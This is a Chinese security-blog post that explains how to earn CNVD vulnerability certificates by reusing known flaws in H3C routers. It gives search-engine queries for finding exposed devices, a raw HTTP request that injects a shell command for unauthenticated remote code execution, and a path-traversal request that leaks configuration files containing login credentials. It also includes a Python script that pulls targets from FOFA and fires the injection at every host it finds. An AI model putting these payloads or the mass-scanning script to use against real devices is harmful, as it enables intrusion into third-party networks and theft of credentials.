#  CNVD通用型漏洞挖掘-cnvd证书的刷洞技巧   
 Z2O安全攻防   2024-12-01 13:19  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1XPO4ohbm1iaewicchqAkAp40qibySic2QYQAFYqVaLOd8AzL7ic9m3Yfghmt1kvo3ib2hEfnMVTGBus91/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1XPO4ohbm1iaeU0ZSIviaEWPbdib6r7SwZM46RAtLmScgwXmd8VJrWAbDOsibnvaewBpicKEAwIb0ibniaF/640?wx_fmt=svg&from=appmsg "")  
  
  
> 该篇是利用nday或者1day来进行捡漏的刷洞技巧通用型:中危及中危以上的通用性漏洞（CVSS2.0基准评分超过4.0）软件开发商注册资金大于等于5000万人民币并且十个URL案例(3个复现,剩下7个贴上URL即可)  
  
  
  
fofa  
  
# 找网络设备(有多种型号的)  
  
  
  
这里的刷洞技巧就是需要有多种型号的,有多种型号就有机会捡漏到cnvd证书(本文举例H3C的设备)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UtqE5xShKic846qtPARGXKQSUrakobgdXpqgUiaSs0h4PzY9mfKLh32Jw/640?wx_fmt=png&from=appmsg "图片")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UO2r8HlotvALwJmKiarhrXYr751sYlNMCUvicttdN38uT76EmS3RH630A/640?wx_fmt=png&from=appmsg "")  
  
这里比如挑选H3C的网络设备进行刷洞,可以看到有多种型号  
  
然后再搜一搜  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UHXpqFNIeiaDf1IxyjgPS7oVRqtqyTH1k31yp5XicyYca0R4842iaW7bfA/640?wx_fmt=png&from=appmsg "")  
  
资产发现:  
  
fofa：app="H3C-Ent-Router"hunter：app.name="H3C Router Management"  
  
  
漏洞1:  
  
H3C多系列路由器存在前台RCE漏洞> 漏洞编号：> 漏洞说明：Referer: http://{{Hostname}}/userLogin.asp访问http://xxx/test> 漏洞特征：> 验证脚本：HTTP```POST /goform/aspForm HTTP/1.1Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedCMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);```> 响应代码特征:302  
  
  
漏洞2:  
  
H3C多系列路由器存在任意用户登录漏洞> 漏洞编号：> 漏洞说明：根据根据系统名修改payload 中的 ER2200G2.cfg> 漏洞特征：> 验证脚本：HTTP```GET /userLogin.asp/../actionpolicy_status/../{设备型号}.cfg HTTP/1.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close```> 响应代码特征：200> 响应内容特征：^(?=.*?vtyname)(?=.*?vtypasswd).*?$漏洞1复现截图:  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UXtw4fZpGzT9OJG2NPtz32xsKaN6x24VvEDDJv0p7SxuLWtZpkyTKEQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UgawzOWuFKD0wl13bux1DibFicqPceEjQYcia9LmRS1Th6btWwm81CnEPw/640?wx_fmt=jpeg&from=appmsg "")  
  
响应包为302  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UEJdIzUC94olwFLHokCiaHSziat0PDJ1QUjPCr50uwJwLjhibMSBldbiciaA/640?wx_fmt=jpeg&from=appmsg "")  
  
访问/test获得执行结果  
  
  
漏洞2复现截图:  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UXtw4fZpGzT9OJG2NPtz32xsKaN6x24VvEDDJv0p7SxuLWtZpkyTKEQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UHgA8yWx65UM3ZHuYWhgZd2L8dUczvWchCDn5hXYYu2pEKywX5caTsA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UuVICKxic3y4F2HvVRyRpmclmLc7hT6KA0HkltcxZ0LndCsUFsqLTgsA/640?wx_fmt=jpeg&from=appmsg "")  
  
获得账号和密码即可登录  
  
然后我们写个批量poc检测脚本(这里是用的漏洞1):  
```
import requests

# 设置 FOFA API Key 和查询语句
FOFA_EMAIL = "your_email@example.com"
FOFA_KEY = "your_fofa_api_key"
QUERY = 'app="H3C-Ent-Router"'

# 使用 FOFA 获取目标资产列表
def get_targets():
    url = "https://fofa.info/api/v1/search/all"
    params = {"qbase64": FOFA_KEY.encode("utf-8").hex() + "=" + QUERY.encode("utf-8").hex(),
              "email": FOFA_EMAIL }
    response = requests.get(url, params=params)
    if response.status_code == 200:
        results = response.json()
        return [result[0] for result in results["results"]]
    else:
        raise Exception("Failed to retrieve targets from FOFA")

# 构造并发送包含 pop 参数的 POST 请求
def send_request(target_url):
    url = target_url + "/goform/aspForm"
    headers = {"Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded",
               "Referer": target_url + "/userLogin.asp",
               "Accept-Encoding": "gzip"}
    data = {"CMD": "DelL2tpLNSList", "GO": "vpn_l2tp_session.asp", "param": "1; $(ls>/www/test);" }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    if response.status_code == 302:
        url = target_url + "/test"
        kali = requests.get(url,verify=False)
        if kali.text == "var":
            print(f"[+] Target {target_url} is vulnerable!")

    else:
        print(f"[-] Target {target_url} is not vulnerable.")

# 获取目标资产列表，并逐个发送请求
targets = get_targets()
for target in targets:
    try:
        send_request(target)
    except Exception as ex:
        print(f"[-] Failed to test target {target}: {ex}")
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oPgdHzwtAqlxHmMOIY5g4UlY6HfZZSQXIVw4vuUr4lzU1d0LZ658mI6LkQXIof1ScfhXEFxgoyNg/640?wx_fmt=png&from=appmsg "")  
  
再根据你找的这个型号在cnvd官网查一下,没有我们就可以尝试提交  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oMdtUurG65rDSTnLakWIGWxuujezbYPTFpzn2WdKEClA2gY5bDLVicsMohQldibHPxRzYBXXt3gG6Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oMdtUurG65rDSTnLakWIGWYFtQh4KNePWIlsgcj0fjbsatuzthGUGLDVkQNLPfFnaklUTiaNY8Ywg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8oyzrJMb9UvUBTKdrt26fIeMzuiaBJ3SkB5WuySHicMUjaMG4JAO2lHekcLYdFyxcV3VgwCpuOkJqWw/640?wx_fmt=png&from=appmsg "")  
  
这些都可以去试试其他的型号  
,  
捡漏成功就是一张证书  
  
建立了一个  
src专项圈子，内容包含**src漏洞知识库**、**src挖掘技巧**、**src视频教程**等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、小群一起挖洞
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOABrvjQvw6cnCXlwS05xyzHjx9JgU7j83aReoqqUbdpiaMX2HeudxqYg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuYNrQ0ia0KSCzpoSaxj6aRms9a99VzT8j2w5PUvhovoSX9F2G0icerjj276GFzwI6XIrJoFYwzK1OpQ/640?wxfrom=12&tp=wxpic&wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6aUeMdaWrKXgYYia2On8nMA7bqWDySa8odAq1a0kkp3WFgf0Zp0Eut0A/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "null")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKub5zKpgA0HmT6klBJg9IugIx3z6YtXqmOkmp18nLD3bpyy8w4daHlAWQn4HiauibfBAk0mrh2qNlY8A/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKub5zKpgA0HmT6klBJg9IugI5tZcaxhZn1icWvbgupXzkwybR5pCzxge4SKxSM5z4s9kwOmvuI3cIkQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOHgjJxnq1ibibJgVUx3LwCjZj62vygx8w6rxia1icmIWiax2YlP6S6LmlmlQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOApVm8H605qOibxia5DqPHfbWD6lmcweDjGv4DLl45waD068ugw2Iv2vg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOwldaSATYOh1WQpk1qz15rLxehOAn4aK7tdbSyNEuHDZpIISCtl6Q8w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKub5zKpgA0HmT6klBJg9IugIstia27YLJFBtC5icJO6gHLLgzRDqib6upI3BsVFfLL02w6Q8jIRRp0NJA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6JWUFIwPbP7Au1PYLXTplb3bbFZFlaYDtXXTqPdzOO6iaFz8F7r8WUPw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1XPO4ohbm1iaeO1Aq5AreyjicBKRbVLPkdsVFicCT5lg16sFH693fbkwbnIicS3Vr29KXW83guicLdhUo/640?wx_fmt=svg&from=appmsg "")  
  
  
~  
  
